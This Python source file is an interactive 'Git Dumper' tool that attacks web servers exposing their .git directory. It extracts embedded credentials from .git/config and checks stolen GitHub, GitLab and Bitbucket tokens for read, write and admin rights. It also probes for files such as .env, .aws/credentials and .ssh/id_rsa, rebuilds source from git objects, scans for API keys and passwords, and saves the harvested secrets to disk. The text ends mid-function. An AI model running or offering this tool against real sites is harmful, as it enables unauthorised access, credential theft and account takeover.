#!/usr/bin/env python3
"""
Git Repository Dumper & Explorer
BOB MARLEY LABS - Interactive Git Source Code Browser
"""
import requests
import os
import sys
import zlib
import re
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    C = "\033[96m"
    W = "\033[97m"
    RST = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

# Storage
repo_files = []
current_file = None
current_content = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""{C.C}{C.BOLD}
     ██████╗ ██╗████████╗    ██████╗ ██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
    ██╔════╝ ██║╚══██╔══╝    ██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
    ██║  ███╗██║   ██║       ██║  ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
    ██║   ██║██║   ██║       ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗
    ╚██████╔╝██║   ██║       ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║
     ╚═════╝ ╚═╝   ╚═╝       ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
{C.RST}
            {C.Y}{C.BOLD}INTERACTIVE GIT REPOSITORY BROWSER{C.RST}
            {C.M}Bob Marley Labs | VENI VIDI VICI{C.RST}
"""
    print(banner)

def fetch_git_file(base_url, path):
    """Fetch a file from exposed .git directory"""
    url = f"{base_url}/.git/{path}"
    try:
        resp = requests.get(url, timeout=15, verify=False)
        if resp.status_code == 200:
            return resp.content
        return None
    except:
        return None

def test_credential_permissions(credential_info):
    """Test what permissions a credential has"""
    if not credential_info or not credential_info.get('credentials'):
        return None
    
    cred = credential_info['credentials'][0]
    token = cred.get('password', '')
    username = cred.get('username', '')
    remote_url = credential_info.get('remote_url', '')
    
    results = {
        'platform': None,
        'valid': False,
        'scopes': [],
        'can_read': False,
        'can_write': False,
        'can_admin': False,
        'user_info': {},
        'no_token': False
    }
    
    # Check if we have a token/password
    if not token:
        results['no_token'] = True
        results['platform'] = 'unknown'
        if 'bitbucket' in remote_url:
            results['platform'] = 'bitbucket'
        elif 'github' in remote_url:
            results['platform'] = 'github'
        elif 'gitlab' in remote_url:
            results['platform'] = 'gitlab'
        return results
    
    # Detect platform
    if 'github.com' in remote_url:
        results['platform'] = 'github'
        
        # Test GitHub token
        headers = {'Authorization': f'token {token}'}
        
        try:
            # Get token info
            resp = requests.get('https://api.github.com/user', headers=headers, timeout=10)
            
            if resp.status_code == 200:
                results['valid'] = True
                user_data = resp.json()
                results['user_info'] = {
                    'login': user_data.get('login'),
                    'name': user_data.get('name'),
                    'email': user_data.get('email'),
                    'type': user_data.get('type')
                }
                
                # Check scopes from headers
                scopes = resp.headers.get('X-OAuth-Scopes', '')
                if scopes:
                    results['scopes'] = [s.strip() for s in scopes.split(',')]
                    
                    # Determine permissions
                    if 'repo' in results['scopes'] or 'public_repo' in results['scopes']:
                        results['can_read'] = True
                        results['can_write'] = True
                    
                    if 'delete_repo' in results['scopes'] or 'admin:org' in results['scopes']:
                        results['can_admin'] = True
                
            elif resp.status_code == 401:
                results['valid'] = False
        except:
            pass
    
    elif 'gitlab.com' in remote_url or 'gitlab' in remote_url:
        results['platform'] = 'gitlab'
        
        # Determine GitLab instance
        gitlab_host = 'https://gitlab.com'
        if 'gitlab.com' not in remote_url:
            # Extract custom GitLab host
            host_match = re.search(r'https?://([^/]+)', remote_url)
            if host_match:
                gitlab_host = f"https://{host_match.group(1)}"
        
        headers = {'PRIVATE-TOKEN': token}
        
        try:
            # Get user info
            resp = requests.get(f'{gitlab_host}/api/v4/user', headers=headers, timeout=10)
            
            if resp.status_code == 200:
                results['valid'] = True
                user_data = resp.json()
                results['user_info'] = {
                    'username': user_data.get('username'),
                    'name': user_data.get('name'),
                    'email': user_data.get('email'),
                    'is_admin': user_data.get('is_admin', False)
                }
                
                # Get token scopes
                resp_token = requests.get(f'{gitlab_host}/api/v4/personal_access_tokens/self', headers=headers, timeout=10)
                if resp_token.status_code == 200:
                    token_data = resp_token.json()
                    results['scopes'] = token_data.get('scopes', [])
                    
                    # Determine permissions
                    if 'read_repository' in results['scopes'] or 'api' in results['scopes']:
                        results['can_read'] = True
                    
                    if 'write_repository' in results['scopes'] or 'api' in results['scopes']:
                        results['can_write'] = True
                    
                    if 'api' in results['scopes'] or 'admin_mode' in results['scopes']:
                        results['can_admin'] = True
                
            elif resp.status_code == 401:
                results['valid'] = False
        except:
            pass
    
    elif 'bitbucket' in remote_url:
        results['platform'] = 'bitbucket'
        
        # Bitbucket uses app passwords or tokens
        headers = {'Authorization': f'Bearer {token}'}
        
        try:
            # Try as Bearer token first
            resp = requests.get('https://api.bitbucket.org/2.0/user', headers=headers, timeout=10)
            
            if resp.status_code != 200:
                # Try as app password with username
                import base64
                auth_str = base64.b64encode(f'{username}:{token}'.encode()).decode()
                headers = {'Authorization': f'Basic {auth_str}'}
                resp = requests.get('https://api.bitbucket.org/2.0/user', headers=headers, timeout=10)
            
            if resp.status_code == 200:
                results['valid'] = True
                user_data = resp.json()
                results['user_info'] = {
                    'username': user_data.get('username'),
                    'display_name': user_data.get('display_name'),
                    'account_id': user_data.get('account_id'),
                    'type': user_data.get('type')
                }
                
                # Bitbucket doesn't expose scopes easily, so check capabilities
                results['can_read'] = True  # If we can auth, we can read
                
                # Try to check write permission by getting repositories
                repo_match = re.search(r'bitbucket\.org/([^/]+)/([^/\.]+)', remote_url)
                if repo_match:
                    workspace = repo_match.group(1)
                    repo_slug = repo_match.group(2)
                    
                    # Check repo permissions
                    repo_resp = requests.get(
                        f'https://api.bitbucket.org/2.0/repositories/{workspace}/{repo_slug}',
                        headers=headers,
                        timeout=10
                    )
                    
                    if repo_resp.status_code == 200:
                        repo_data = repo_resp.json()
                        # Check if user has write access
                        # Bitbucket doesn't directly expose this, assume write if authenticated
                        results['can_write'] = True
                
                results['scopes'] = ['repository:read', 'repository:write (assumed)']
                
            elif resp.status_code == 401:
                results['valid'] = False
        except:
            pass
    
    return results

def parse_git_config(base_url):
    """Parse .git/config file"""
    print(f"\n{C.Y}[*] Fetching .git/config...{C.RST}")
    
    config_data = fetch_git_file(base_url, "config")
    if not config_data:
        print(f"{C.R}[!] Cannot access .git/config{C.RST}")
        return None
    
    config_text = config_data.decode('utf-8', errors='ignore')
    print(f"{C.G}[+] .git/config found!{C.RST}\n")
    
    # Parse config
    info = {
        'remote_url': None,
        'username': None,
        'email': None,
        'credentials': []
    }
    
    # Extract remote URL
    remote_match = re.search(r'url\s*=\s*(.+)', config_text)
    if remote_match:
        info['remote_url'] = remote_match.group(1).strip()
        print(f"{C.C}[REMOTE]{C.RST} {info['remote_url']}")
        
        # Check for credentials in URL
        if '@' in info['remote_url']:
            # Try username:password@host format first
            cred_match = re.search(r'//([^:]+):([^@]+)@', info['remote_url'])
            if cred_match:
                info['credentials'].append({
                    'username': cred_match.group(1),
                    'password': cred_match.group(2)
                })
                print(f"{C.R}[!!!CREDENTIALS FOUND!!!]{C.RST}")
                print(f"  Username: {cred_match.group(1)}")
                print(f"  Password: {cred_match.group(2)}")
            else:
                # Try username-only@host format (Bitbucket, etc.)
                cred_match = re.search(r'//([^@]+)@', info['remote_url'])
                if cred_match:
                    info['credentials'].append({
                        'username': cred_match.group(1),
                        'password': None
                    })
                    print(f"{C.Y}[CREDENTIAL FOUND]{C.RST}")
                    print(f"  Username: {cred_match.group(1)}")
                    print(f"  {C.DIM}(Password not in URL - may use SSH key or app password){C.RST}")
    
    # Extract user info
    user_match = re.search(r'name\s*=\s*(.+)', config_text)
    if user_match:
        info['username'] = user_match.group(1).strip()
        print(f"{C.B}[USER]{C.RST} {info['username']}")
    
    email_match = re.search(r'email\s*=\s*(.+)', config_text)
    if email_match:
        info['email'] = email_match.group(1).strip()
        print(f"{C.B}[EMAIL]{C.RST} {info['email']}")
    
    print()
    return info

def parse_git_index(base_url):
    """Parse .git/index to get file list"""
    print(f"{C.Y}[*] Fetching .git/index...{C.RST}")
    
    index_data = fetch_git_file(base_url, "index")
    if not index_data:
        print(f"{C.R}[!] Cannot access .git/index{C.RST}")
        return []
    
    # Verify Git index signature
    if len(index_data) < 12 or index_data[:4] != b'DIRC':
        print(f"{C.R}[!] Invalid Git index file (missing DIRC signature){C.RST}")
        return []
    
    print(f"{C.G}[+] .git/index found! Parsing file list...{C.RST}\n")
    
    files = []
    
    try:
        # Git index v2/v3 format
        # Header: DIRC (4 bytes) + version (4 bytes) + entry count (4 bytes)
        import struct
        
        version = struct.unpack('>I', index_data[4:8])[0]
        entry_count = struct.unpack('>I', index_data[8:12])[0]
        
        if version not in [2, 3, 4]:
            print(f"{C.Y}[~] Unsupported index version: {version}{C.RST}")
            return []
        
        if entry_count > 10000:  # Sanity check
            print(f"{C.Y}[~] Suspicious entry count: {entry_count} (possible corrupted index){C.RST}")
            return []
        
        offset = 12
        
        for i in range(entry_count):
            if offset + 62 > len(index_data):
                break
            
            # Each entry has a fixed 62-byte header
            # SHA-1 hash is at offset+40 (20 bytes)
            sha1_bytes = index_data[offset+40:offset+60]
            sha1_hash = sha1_bytes.hex()
            
            # Skip to flags at offset+60 to get name length
            flags = struct.unpack('>H', index_data[offset+60:offset+62])[0]
            name_length = flags & 0xFFF
            
            # File name starts at offset+62
            name_start = offset + 62
            
            if name_length == 0xFFF:
                # Name is null-terminated
                name_end = index_data.find(b'\x00', name_start)
                if name_end == -1:
                    break
                file_name = index_data[name_start:name_end].decode('utf-8', errors='ignore')
            else:
                # Name has fixed length
                name_end = name_start + name_length
                if name_end > len(index_data):
                    break
                file_name = index_data[name_start:name_end].decode('utf-8', errors='ignore')
            
            # Validate file name (basic sanity check)
            if file_name and 1 <= len(file_name) <= 500 and not any(c in file_name for c in ['\x00', '\r', '\n']):
                files.append({
                    'path': file_name,
                    'sha1': sha1_hash
                })
            
            # Calculate padding to next entry (entries are padded to 8-byte boundary)
            entry_len = 62 + len(file_name.encode('utf-8'))
            padding = (8 - (entry_len % 8)) % 8
            offset = offset + entry_len + padding
        
        print(f"{C.G}[+] Successfully parsed {len(files)} entries from index{C.RST}")
        
    except Exception as e:
        print(f"{C.R}[!] Error parsing index: {str(e)}{C.RST}")
        return []
    
    return files

def download_git_objects(base_url, hostname):
    """Download all Git objects and reconstruct files"""
    print(f"{C.Y}[*] Downloading Git repository...{C.RST}")
    
    # Create output directory
    output_dir = "Results"
    os.makedirs(output_dir, exist_ok=True)
    
    downloaded_files = []
    
    # Download key files
    key_files = ['config', 'HEAD', 'index', 'packed-refs', 'description']
    
    for file in key_files:
        data = fetch_git_file(base_url, file)
        if data:
            filepath = f"{output_dir}/.git_{hostname}_{file}"
            with open(filepath, 'wb') as f:
                f.write(data)
            print(f"{C.G}[+] Downloaded: {file}{C.RST}")
            downloaded_files.append((file, filepath, len(data)))
    
    # Try to download common refs
    refs = ['refs/heads/master', 'refs/heads/main', 'refs/heads/develop', 'logs/HEAD']
    
    for ref in refs:
        data = fetch_git_file(base_url, ref)
        if data:
            ref_file = ref.replace('/', '_')
            filepath = f"{output_dir}/.git_{hostname}_{ref_file}"
            with open(filepath, 'wb') as f:
                f.write(data)
            print(f"{C.G}[+] Downloaded: {ref}{C.RST}")
            downloaded_files.append((ref, filepath, len(data)))
    
    # Save summary
    if downloaded_files:
        summary_file = f"{output_dir}/git_dump_{hostname}_files.txt"
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write(f"Git Repository Files Downloaded\n")
            f.write(f"Target: {base_url}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("="*70 + "\n\n")
            
            for git_file, filepath, size in downloaded_files:
                f.write(f"{git_file:30s} -> {filepath} ({size} bytes)\n")
            
            f.write("\n" + "="*70 + "\n")
        
        print(f"{C.G}[+] Download summary saved to: {summary_file}{C.RST}")
    
    return downloaded_files

def get_file_from_git_object(base_url, sha1_hash):
    """Fetch file content from Git object using SHA-1 hash"""
    if not sha1_hash or len(sha1_hash) != 40:
        return None
    
    # Git stores objects as .git/objects/XX/YYYYYYYY...
    obj_path = f"objects/{sha1_hash[:2]}/{sha1_hash[2:]}"
    obj_data = fetch_git_file(base_url, obj_path)
    
    if not obj_data:
        return None
    
    try:
        # Git objects are zlib compressed
        decompressed = zlib.decompress(obj_data)
        
        # Format: "blob <size>\0<content>"
        null_idx = decompressed.find(b'\x00')
        if null_idx == -1:
            return None
        
        content = decompressed[null_idx + 1:]
        return content.decode('utf-8', errors='ignore')
    except:
        return None

def view_file_content(base_url, filepath, sha1_hash=None):
    """Try to fetch file content directly or from Git objects"""
    # Try direct HTTP access first
    url = f"{base_url}/{filepath}"
    
    try:
        resp = requests.get(url, timeout=10, verify=False)
        if resp.status_code == 200:
            content = resp.text
            
            # Detect if we got HTML error page instead of actual file
            html_indicators = ['<!DOCTYPE', '<html', '<HTML', '<head>', '<body>', '<title>404', '<title>Error']
            if any(indicator in content[:500] for indicator in html_indicators):
                content = None
            else:
                return content
    except:
        pass
    
    # If direct access failed and we have SHA-1, try Git object
    if sha1_hash:
        return get_file_from_git_object(base_url, sha1_hash)
    
    return None

def search_secrets(content):
    """Search for secrets in file content"""
    secrets = []
    
    patterns = {
        'API Key': r'api[_-]?key["\'\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
        'Secret Key': r'secret[_-]?key["\'\s:=]+["\']?([a-zA-Z0-9_-]{20,})["\']?',
        'Password': r'password["\'\s:=]+["\']?([^\s\'"<>]{10,})["\']?',
        'Database URL': r'(mysql|postgres|postgresql|mongodb)://[^\s\'"<>]+',
        'Connection String': r'(Server|Data Source|Initial Catalog)=[^\s;]+',
        'AWS Key': r'AKIA[0-9A-Z]{16}',
        'GitLab Token': r'glpat-[a-zA-Z0-9_-]{20,}',
        'GitHub Token': r'gh[pousr]_[a-zA-Z0-9]{36,}',
        'GitHub PAT': r'ghp_[a-zA-Z0-9]{36,}',
        'JWT': r'eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}',
        'Private Key': r'-----BEGIN (?:RSA |)PRIVATE KEY-----'
    }
    
    # False positive patterns - HTML/CSS/JS syntax
    false_positives = [
        r'^[:\[\],\s\(\)=<>]+$',  # Only symbols/whitespace
        r'^(input|select|textarea|button|type|focus|hover|active|click|submit|reset)',  # HTML/CSS keywords
        r'^\[',  # Starts with bracket (CSS selectors)
        r'^[\]:,\(\)]+',  # CSS syntax patterns
        r'^\w+\[',  # CSS attribute selectors
        r'^(required|disabled|readonly|checked|selected|hidden|autofocus)=?$',  # HTML attributes
        r'^(text|email|number|tel|url|search|date|time|color|range|file)=?$',  # Input types
        r'^\$\{',  # Template variables
        r'^\w+\(\)',  # Function calls
        r'^(true|false|null|undefined|none)$',  # Boolean/null values
        r'^\d+$',  # Only numbers
    ]
    
    for secret_type, pattern in patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                
                # Filter false positives
                is_false_positive = False
                
                # Check against false positive patterns
                for fp_pattern in false_positives:
                    if re.match(fp_pattern, match, re.IGNORECASE):
                        is_false_positive = True
                        break
                
                # Additional checks for password field
                if secret_type == 'Password':
                    # Skip if too short or only special chars
                    if len(match) < 10 or not re.search(r'[a-zA-Z0-9]', match):
                        is_false_positive = True
                    # Skip HTML/CSS/JS patterns
                    if any(x in match.lower() for x in ['input', 'type=', 'focus', 'hover', 'required', 
                                                          'placeholder', 'value=', 'name=', 'id=', 'class=']):
                        is_false_positive = True
                    # Skip if it's an HTML attribute name
                    if re.match(r'^(required|disabled|readonly|checked|selected|hidden|maxlength|minlength|pattern|autocomplete)=?$', match, re.IGNORECASE):
                        is_false_positive = True
                    # Must contain at least some variety (not all same char)
                    if len(set(match)) < 4:
                        is_false_positive = True
                
                if not is_false_positive:
                    secrets.append({
                        'type': secret_type,
                        'value': match
                    })
    
    return secrets

def interactive_menu():
    """Interactive menu"""
    global repo_files, current_file, current_content
    
    print(f"\n{C.BOLD}{'='*70}{C.RST}")
    print(f"{C.G}[1]{C.RST} Download entire repository")
    print(f"{C.G}[2]{C.RST} List files from .git/index")
    print(f"{C.G}[3]{C.RST} View specific file")
    print(f"{C.G}[4]{C.RST} Search for secrets in files")
    print(f"{C.G}[5]{C.RST} Show .git/config details")
    print(f"{C.G}[6]{C.RST} Try common sensitive files")
    print(f"{C.M}[7]{C.RST} Test credential permissions")
    print(f"{C.C}[8]{C.RST} Quick scan (auto-run important checks)")
    print(f"{C.R}[0]{C.RST} Exit")
    print(f"{C.BOLD}{'='*70}{C.RST}")
    
    choice = input(f"{C.Y}[?] Select option: {C.RST}").strip()
    return choice

def try_common_files(base_url):
    """Try to access common sensitive files"""
    print(f"\n{C.Y}[*] Testing common sensitive files...{C.RST}\n")
    
    sensitive_files = [
        '.env',
        'app/etc/env.php',
        'config/database.yml',
        'config/secrets.yml',
        '.aws/credentials',
        '.ssh/id_rsa',
        'composer.json',
        'package.json',
        'docker-compose.yml',
        '.gitlab-ci.yml',
        '.github/workflows/deploy.yml',
        'secrets.json',
        'credentials.json',
        'config.php',
        'wp-config.php'
    ]
    
    found_files = []
    
    for file in sensitive_files:
        content = view_file_content(base_url, file)
        if content:
            print(f"{C.G}[FOUND]{C.RST} {file} ({len(content)} bytes)")
            print(f"{C.DIM}  URL: {base_url}/{file}{C.RST}")
            
            # Show preview
            preview_lines = content.split('\n')[:3]
            print(f"{C.DIM}  Preview:{C.RST}")
            for line in preview_lines:
                if line.strip():
                    print(f"{C.DIM}    {line[:70]}{C.RST}")
            
            # Search for secrets
            secrets = search_secrets(content)
            if secrets:
                print(f"{C.R}  [!!!SECRETS FOUND!!!]{C.RST}")
                for secret in secrets[:3]:
                    print(f"    {secret['type']}: {secret['value'][:50]}...")
            
            found_files.append({
                'path': file,
                'content': content,
                'secrets': secrets
            })
            print()
    
    if not found_files:
        print(f"{C.Y}[~] No common files accessible{C.RST}")
    
    return found_files

def main():
    global repo_files, current_file, current_content
    
    print_banner()
    
    # Ask for target URL
    print(f"{C.BOLD}{'='*70}{C.RST}")
    base_url = input(f"{C.Y}[?] Enter target URL (e.g., https://site.com): {C.RST}").strip()
    
    if not base_url:
        print(f"{C.R}[!] No URL provided{C.RST}")
        sys.exit(1)
    
    base_url = base_url.rstrip('/')
    
    # Remove /.git if included
    if base_url.endswith('/.git'):
        base_url = base_url[:-5]
    
    hostname = base_url.replace('https://', '').replace('http://', '').split('/')[0]
    output_dir = "Results"
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"{C.BOLD}{'='*70}{C.RST}\n")
    
    print(f"{C.BOLD}Target: {C.C}{base_url}{C.RST}")
    print(f"{C.BOLD}Output: {C.C}{output_dir}/git_dump_{hostname}.txt{C.RST}\n")
    
    # Step 1: Parse config
    config_info = parse_git_config(base_url)
    
    if not config_info:
        print(f"{C.R}[!] .git directory not accessible{C.RST}")
        sys.exit(1)
    
    # Auto-save .git/config info (always save if found)
    result_file = f"{output_dir}/git_dump_{hostname}.txt"
    with open(result_file, 'w', encoding='utf-8') as f:
        f.write(f"Git Repository Dump\n")
        f.write(f"Target: {base_url}\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write("="*70 + "\n\n")
        
        f.write("GIT CONFIGURATION\n")
        f.write("-"*70 + "\n")
        f.write(f"Remote URL: {config_info['remote_url']}\n")
        
        if config_info.get('credentials'):
            f.write("\nCREDENTIALS FOUND:\n")
            for cred in config_info['credentials']:
                f.write(f"  Username: {cred.get('username')}\n")
                if cred.get('password'):
                    f.write(f"  Password/Token: {cred.get('password')}\n")
                else:
                    f.write(f"  Password: (Not in URL - uses SSH/OAuth)\n")
        else:
            f.write("\nCREDENTIALS: None in URL (likely uses SSH key)\n")
        
        if config_info.get('username'):
            f.write(f"\nGit User: {config_info['username']}\n")
        if config_info.get('email'):
            f.write(f"Git Email: {config_info['email']}\n")
        
        f.write("\n" + "="*70 + "\n\n")
    
    if config_info.get('credentials'):
        print(f"{C.G}[+] Credentials saved to: {result_file}{C.RST}\n")
    else:
        print(f"{C.G}[+] Config saved to: {result_file}{C.RST}\n")
    
    # Step 2: Verify if repo is actually exploitable by checking index
    print(f"{C.Y}[*] Verifying repository accessibility...{C.RST}")
    test_index = fetch_git_file(base_url, "index")
    
    repo_exploitable = False
    
    if not test_index or len(test_index) < 12 or test_index[:4] != b'DIRC':
        print(f"{C.R}[!] WARNING: .git/config is exposed but .git/index is NOT accessible{C.RST}")
        print(f"{C.Y}[~] The credentials in .git/config may still be valid, but you cannot dump the repo{C.RST}")
        print(f"{C.Y}[~] This is a FALSE POSITIVE for repository dumping{C.RST}\n")
        print(f"{C.Y}[*] You can still try option 6 (common files) to check for exposed files{C.RST}")
    else:
        # Index exists, but verify we can actually fetch files from it
        print(f"{C.Y}[*] .git/index found, verifying file accessibility...{C.RST}")
        
        # Quick parse to get a few file paths
        try:
            import struct
            entry_count = struct.unpack('>I', test_index[8:12])[0]
            
            if entry_count > 0 and entry_count < 10000:
                # Try to extract first file path
                offset = 12
                files_to_test = []
                
                for i in range(min(5, entry_count)):  # Test first 5 files
                    if offset + 62 > len(test_index):
                        break
                    
                    flags = struct.unpack('>H', test_index[offset+60:offset+62])[0]
                    name_length = flags & 0xFFF
                    name_start = offset + 62
                    
                    if name_length == 0xFFF:
                        name_end = test_index.find(b'\x00', name_start)
                        if name_end == -1:
                            break
                        file_name = test_index[name_start:name_end].decode('utf-8', errors='ignore')
                    else:
                        name_end = name_start + name_length
                        if name_end > len(test_index):
                            break
                        file_name = test_index[name_start:name_end].decode('utf-8', errors='ignore')
                    
                    if file_name and len(file_name) > 0:
                        files_to_test.append(file_name)
                    
                    entry_len = 62 + len(file_name.encode('utf-8'))
                    padding = (8 - (entry_len % 8)) % 8
                    offset = offset + entry_len + padding
                
                # Try to fetch at least one file
                accessible_count = 0
                for test_file in files_to_test:
                    content = view_file_content(base_url, test_file)
                    if content:
                        accessible_count += 1
                
                if accessible_count > 0:
                    print(f"{C.G}[+] Repository is fully accessible and exploitable!{C.RST}")
                    print(f"{C.G}[+] Verified {accessible_count}/{len(files_to_test)} test files are accessible{C.RST}")
                    
                    # Show proof - display snippet of actual content
                    print(f"\n{C.Y}[PROOF] Sample content from accessible files:{C.RST}")
                    for test_file in files_to_test[:accessible_count]:
                        content = view_file_content(base_url, test_file)
                        if content:
                            lines = content.split('\n')[:2]  # First 2 lines
                            preview = ' '.join(lines)[:80]  # First 80 chars
                            print(f"{C.DIM}  {test_file}:{C.RST}")
                            print(f"{C.DIM}    {preview}...{C.RST}")
                    print()
                    
                    repo_exploitable = True
                    
                    # Save exploitation status with proof
                    result_file = f"{output_dir}/git_dump_{hostname}.txt"
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write("REPOSITORY STATUS\n")
                        f.write("-"*70 + "\n")
                        f.write(f"Status: FULLY EXPLOITABLE (VERIFIED WITH ACTUAL FILE ACCESS)\n")
                        f.write(f"Total files in index: {entry_count}\n")
                        f.write(f"Test files accessible: {accessible_count}/{len(files_to_test)}\n\n")
                        f.write(f"PROOF - Successfully fetched these files via HTTP:\n")
                        for test_file in files_to_test[:accessible_count]:
                            f.write(f"  ✓ {base_url}/{test_file}\n")
                        f.write("\n" + "="*70 + "\n\n")
                else:
                    print(f"{C.R}[!] WARNING: .git/index exists but source files are NOT accessible{C.RST}")
                    print(f"{C.Y}[~] Index lists {entry_count} files, but they cannot be downloaded directly{C.RST}")
                    print(f"{C.Y}[~] This is a PARTIAL exposure - you may need git-dumper to extract via objects{C.RST}")
                    print(f"{C.Y}[~] Credentials in .git/config are still valid{C.RST}\n")
                    print(f"{C.Y}[*] Try option 1 (Download repository) or option 6 (common files){C.RST}")
                    
                    # Save partial exposure status
                    result_file = f"{output_dir}/git_dump_{hostname}.txt"
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write("REPOSITORY STATUS\n")
                        f.write("-"*70 + "\n")
                        f.write(f"Status: PARTIAL EXPOSURE\n")
                        f.write(f"Total files in index: {entry_count}\n")
                        f.write(f"Direct file access: NOT AVAILABLE\n")
                        f.write(f"Note: May need git-dumper to extract via Git objects\n")
                        f.write("\n" + "="*70 + "\n\n")
            else:
                print(f"{C.R}[!] Invalid entry count in .git/index{C.RST}\n")
        except Exception as e:
            print(f"{C.R}[!] Error validating repository: {str(e)}{C.RST}\n")
    
    while True:
        choice = interactive_menu()
        
        if choice == '0':
            print(f"\n{C.Y}[*] Exiting...{C.RST}\n")
            break
        
        elif choice == '1':
            # Download repository
            print(f"\n{C.Y}[*] Starting repository download...{C.RST}\n")
            download_git_objects(base_url, hostname)
            
            print(f"\n{C.G}[+] Files saved to: {output_dir}/.git_{hostname}_*{C.RST}")
            print(f"{C.Y}[*] Use git-dumper for complete extraction:{C.RST}")
            print(f"{C.C}    pip install git-dumper{C.RST}")
            print(f"{C.C}    git-dumper {base_url}/.git Results/git_dump_{hostname}_complete{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '2':
            # List files
            print(f"\n{C.Y}[*] Parsing .git/index...{C.RST}\n")
            repo_files = parse_git_index(base_url)
            
            if repo_files:
                print(f"{C.G}[+] Found {len(repo_files)} files:{C.RST}\n")
                for i, file_info in enumerate(repo_files[:50], 1):
                    print(f"  {C.C}{i:3d}.{C.RST} {file_info['path']}")
                
                if len(repo_files) > 50:
                    print(f"\n{C.DIM}  ... and {len(repo_files)-50} more files{C.RST}")
            else:
                print(f"{C.Y}[~] No files found in index{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '3':
            # View specific file
            filepath = input(f"\n{C.Y}[?] Enter file path: {C.RST}").strip()
            
            print(f"\n{C.Y}[*] Fetching {filepath}...{C.RST}\n")
            content = view_file_content(base_url, filepath)
            
            if content:
                print(f"{C.G}[+] File found!{C.RST}\n")
                print(f"{C.BOLD}{'='*70}{C.RST}")
                
                # Show first 100 lines
                lines = content.split('\n')
                for i, line in enumerate(lines[:100], 1):
                    print(f"{C.DIM}{i:4d}|{C.RST} {line}")
                
                if len(lines) > 100:
                    print(f"\n{C.DIM}... {len(lines)-100} more lines (use option 1 to download full file){C.RST}")
                
                print(f"{C.BOLD}{'='*70}{C.RST}")
                
                # Search for secrets
                secrets = search_secrets(content)
                if secrets:
                    print(f"\n{C.R}[!!!SECRETS FOUND!!!]{C.RST}")
                    for secret in secrets:
                        print(f"  {C.Y}{secret['type']}:{C.RST} {secret['value']}")
                
                current_file = filepath
                current_content = content
            else:
                print(f"{C.R}[!] File not accessible{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '4':
            # Search secrets
            if not repo_files:
                print(f"\n{C.Y}[*] First loading file list...{C.RST}\n")
                repo_files = parse_git_index(base_url)
            
            if not repo_files:
                print(f"{C.R}[!] No files found. Try option 6 for common files.{C.RST}")
                input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
                continue
            
            # Skip non-secret file types
            skip_extensions = ['.css', '.js', '.min.js', '.min.css', '.jpg', '.png', '.gif', 
                              '.svg', '.woff', '.ttf', '.eot', '.ico', '.map', '.md', '.html', '.htm']
            
            # Filter files that might contain secrets
            secret_candidates = [
                f for f in repo_files 
                if any(x in f['path'].lower() for x in ['.env', 'config', 'secret', 'key', 'password', 'credential', 'database', '.yml', '.yaml', '.json', '.xml', '.ini', '.conf', '.php'])
                and not any(f['path'].lower().endswith(ext) for ext in skip_extensions)
                and 'template' not in f['path'].lower()  # Skip template directories
            ]
            
            if secret_candidates:
                print(f"\n{C.Y}[*] Found {len(secret_candidates)} potential secret files in index{C.RST}")
                print(f"{C.Y}[*] Scanning {min(len(secret_candidates), 20)} files for secrets...{C.RST}\n")
                files_to_scan = secret_candidates[:20]
            else:
                # Get non-CSS/JS files
                filtered_files = [
                    f for f in repo_files 
                    if not any(f['path'].lower().endswith(ext) for ext in skip_extensions)
                ]
                
                if filtered_files:
                    print(f"\n{C.Y}[*] No obvious secret files, scanning first 20 code files...{C.RST}\n")
                    files_to_scan = filtered_files[:20]
                else:
                    print(f"\n{C.Y}[*] Scanning first 20 files...{C.RST}\n")
                    files_to_scan = repo_files[:20]
            
            all_secrets = []
            accessible_count = 0
            git_object_count = 0
            
            for file_info in files_to_scan:
                filepath = file_info['path']
                sha1 = file_info['sha1']
                
                # Try direct HTTP first, fallback to Git object
                content = view_file_content(base_url, filepath, sha1)
                if content:
                    accessible_count += 1
                    
                    # Check if we got it from Git object
                    direct_content = view_file_content(base_url, filepath)
                    if not direct_content:
                        git_object_count += 1
                        print(f"{C.M}[GIT OBJ]{C.RST} {filepath} (via .git/objects)")
                    
                    secrets = search_secrets(content)
                    if secrets:
                        print(f"{C.G}[+] {filepath}{C.RST}")
                        for secret in secrets:
                            print(f"    {C.Y}{secret['type']}:{C.RST} {secret['value'][:50]}...")
                            all_secrets.append({
                                'file': filepath,
                                'content': content,
                                **secret
                            })
            
            print(f"\n{C.DIM}[INFO] Scanned {len(files_to_scan)} files, {accessible_count} were accessible{C.RST}")
            if git_object_count > 0:
                print(f"{C.M}[INFO] {git_object_count} files extracted from Git objects (bypassed HTTP restrictions){C.RST}")
            
            if all_secrets:
                print(f"{C.R}[TOTAL] {len(all_secrets)} secrets found!{C.RST}")
                
                # Auto-save secrets
                result_file = f"{output_dir}/git_dump_{hostname}.txt"
                
                # Append or update file
